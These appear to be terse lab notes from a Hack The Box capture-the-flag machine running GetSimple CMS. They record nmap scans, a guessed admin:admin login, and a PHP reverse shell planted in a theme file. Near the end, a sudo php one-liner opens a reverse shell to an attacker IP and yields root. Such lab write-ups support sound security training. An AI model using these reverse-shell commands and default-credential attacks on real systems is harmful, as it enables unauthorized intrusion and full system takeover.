Notes

IP 10.129.211.97
Runs GetSimple on Apache
/admin in robots.txt
admin page shows jquery 3.3.15 and fancybox 2.0.4
creds guessed
	admin:admin
Admin -> support 
	getsimple version 3.3.15
	php 7.4.3
	apache 2.4.41
	bunch of writeable directories
Admin/upload
	create folder
	look at uploaded files
Admin/theme
	theme can be edited in php
place php shell in a them then we navigate to the them folder
PHP shell is found at http://gettingstarted.htb/theme/Cardinal/template.php
Use for the shell -> [raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

Once logged in check users
we find user mrb3n
run sudo -l to see what www-data can run. /usr/bin/php
run linenum.sh and we see its ubuntu 20.04.2

Versions
ubuntu 20.04.2
apache 2.4.41
php 7.4.3
getsimple version 3.3.15
fancybox 2.0.4
jquery 3.3.15
mysql  Ver 8.0.23-0ubuntu0.20.04.1
Sudo version 1.8.31



Commands
nmap -sV --open -oA initial_scan 10.129.211.97
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
nmap -p- --open -oA full_tcp_scan 10.129.211.97
	nothing new
nmap -sC -p 22,80 -oA script_scan  10.129.211.97
22/tcp open  ssh
	| ssh-hostkey: 
	|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
	|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
	|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
	80/tcp open  http
	| http-robots.txt: 1 disallowed entry 
	|_/admin/
	|_http-title: Welcome to GetSimple! - gettingstarted
nc -lvnp 9001
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /home/mrb3n
cat user.txt
sudo -l
	/usr/bin/php
	sudo /usr/bin/php -r '$sock=fsockopen("10.10.15.74",9002);exec("/bin/sh -i <&3 >&3 2>&3");'
nc -lvnp 9002

GOT ROOT


linenum.sh


